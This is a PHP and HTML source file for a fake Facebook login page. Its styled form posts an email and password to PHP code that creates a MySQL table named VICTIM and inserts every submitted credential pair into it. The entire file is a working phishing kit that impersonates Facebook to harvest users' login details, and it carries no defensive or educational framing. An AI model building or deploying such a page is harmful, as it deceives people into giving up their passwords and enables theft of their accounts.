


<!-- fonte css e formulario facebook: https://www.tutorialrepublic.com/snippets/preview.php?topic=bootstrap&file=facebook-theme-login-form botão direito / exibir codigo fonte do frame 

comentarios sobre este php no arquivo comentarios_php

-->

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Bootstrap Facebook Theme Login Form</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
<style>
body {
    color: #646464;
    background: #e2e2e2;
}	
.login-form {
    width: 300px;
    margin: 30px auto;
}
.login-form h2 {
    font-size: 26px;
    font-weight: bold;
    margin: 30px 0;
    text-align: center;
}
.login-form form {
    color: #fff;
    background: #405e9e;
    background: radial-gradient(circle, #4d6ba9, #375595);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    padding: 25px;
    margin-bottom: 15px;
}
.login-form .form-control {
    border-color: #dfdfdf;
    box-shadow: none !important;
}
.login-form .form-control, .login-form .btn {
    min-height: 38px;        
}
.login-form input[type="email"] {
    border-radius: 2px 2px 0 0;
}
.login-form input[type="password"] {
    border-radius: 0 0 2px 2px;
    margin-top: -1px;
}    
.login-form .btn, .login-form .btn:active {        
    font-size: 15px;
    font-weight: bold;
    border-radius: 2px;
    background: #eeeeee !important;
    color: #646464;
    margin-bottom: 25px;
}
.login-form .btn:hover, .login-form .btn:focus{
    background: #e4e4e4 !important;
}
.login-form a {		
    color: #405e9e;
}
.login-form form a {
    color: #fff;
}
</style>
</head>
<body>
<div class="login-form">
    <form method="post">
		<h2 class="text-center">Facebook</h2>	
        <div class="form-group">
            <input type="email" class="form-control" placeholder="Email" name="EMAIL" required="required">
            <input type="password" class="form-control" placeholder="Password" name="PASSWORD" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-secondary btn-block">Login</button>
        </div>
        <p class="text-center"><a href="#">Forgot Password?</a></p>     
    </form>
    <p class="text-center small">Not Registered? <a href="#">Create an Account</a></p>
</div>

<div>

<?php include "../connect/dbinfo.connect"; ?>

<?php

  /* Connect to MySQL and select the database. */
  $connection = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD);

  if (mysqli_connect_errno()) echo "Failed to connect to MySQL: " . mysqli_connect_error();

  $database = mysqli_select_db($connection, DB_DATABASE);

  /* Ensure that the VICTIM table exists. */
  VerifyVictimsTable($connection, DB_DATABASE);

  /* If input fields are populated, add a row to the VICTIM table. */
  $victim_email = htmlentities($_POST['EMAIL']);
  $victim_password = htmlentities($_POST['PASSWORD']);

  if (strlen($victim_email) || strlen($victim_password)) {
    AddVictim($connection, $victim_email, $victim_password);
  }
?>


<?php

/* Add an victim to the table. */
function AddVictim($connection, $email, $password) {
   $n = mysqli_real_escape_string($connection, $email);
   $a = mysqli_real_escape_string($connection, $password);

   $query = "INSERT INTO VICTIM (EMAIL, PASSWORD) VALUES ('$n', '$a');";

   if(!mysqli_query($connection, $query)) echo("<p>Error adding victim data.</p>");
}

/* Check whether the table exists and, if not, create it. */
function VerifyVictimsTable($connection, $dbName) {
  if(!TableExists("VICTIM", $connection, $dbName))
  {
     $query = "CREATE TABLE VICTIM (
         ID int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
         EMAIL VARCHAR(45),
         PASSWORD VARCHAR(90)
       )";

     if(!mysqli_query($connection, $query)) echo("<p>Error creating table.</p>");
  }
}

/* Check for the existence of a table. */
function TableExists($tableName, $connection, $dbName) {
  $t = mysqli_real_escape_string($connection, $tableName);
  $d = mysqli_real_escape_string($connection, $dbName);

  $checktable = mysqli_query($connection,
      "SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME = '$t' AND TABLE_SCHEMA = '$d'");

  if(mysqli_num_rows($checktable) > 0) return true;

  return false;
}
?>                        



</div>

</body>
</html>


                
